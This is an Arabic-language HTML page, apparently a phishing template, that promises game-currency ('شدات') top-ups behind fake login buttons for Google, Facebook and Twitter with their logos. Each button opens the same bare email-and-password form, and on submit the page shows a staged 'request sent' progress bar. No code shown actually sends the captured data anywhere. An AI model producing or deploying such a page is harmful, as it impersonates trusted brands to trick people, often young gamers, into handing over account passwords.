<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول وشحن شدات</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #1a1a1a, #333);
            background-size: 400% 400%;
            animation: backgroundAnimation 20s infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #fff;
            direction: rtl;
        }

        @keyframes backgroundAnimation {
            0% { background-position: 0 0; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0 0; }
        }

        .container {
            background-color: rgba(28, 28, 28, 0.8);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }

        h1 {
            color: #FFD700;
            margin-bottom: 20px;
        }

        button {
            background-color: #FFD700;
            color: black;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
        }

        .login-buttons {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .login-buttons button {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-buttons img {
            margin-left: 10px;
            width: 24px;
            height: 24px;
        }

        .login-form {
            display: none;
            flex-direction: column;
            gap: 10px;
        }

        .login-form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
            box-sizing: border-box;
        }

        .notification {
            display: none;
            background-color: #FFD700;
            color: black;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-top: 20px;
            position: relative;
        }

        .notification p {
            margin: 0;
        }

        .progress-bar {
            width: 100%;
            background-color: #ddd;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 10px;
            height: 20px;
        }

        .progress-bar div {
            height: 100%;
            background-color: #ff3333;
            width: 0;
            animation: progressBarAnimation 5s linear forwards;
        }

        @keyframes progressBarAnimation {
            0% { width: 0; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>تسجيل الدخول</h1>
        <div class="login-buttons">
            <button onclick="showLoginForm('google')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">تسجيل الدخول عبر Google
            </button>
            <button onclick="showLoginForm('facebook')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">تسجيل الدخول عبر Facebook
            </button>
            <button onclick="showLoginForm('twitter')">
                <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter Logo">تسجيل الدخول عبر Twitter
            </button>
        </div>
        <form class="login-form" id="loginForm">
            <input type="email" placeholder="البريد الإلكتروني" required>
            <input type="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="notification" id="notification">
            <p>جاري إرسال الطلب...</p>
            <div class="progress-bar">
                <div></div>
            </div>
        </div>
    </div>
    <script>
        function showLoginForm(platform) {
            const loginForm = document.getElementById('loginForm');
            loginForm.style.display = 'flex';
        }

        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();
            const notification = document.getElementById('notification');
            notification.style.display = 'block';

            setTimeout(() => {
                notification.querySelector('p').innerText = 'تم إرسال الطلب';
            }, 5000);
        });
    </script>
</body>
</html>
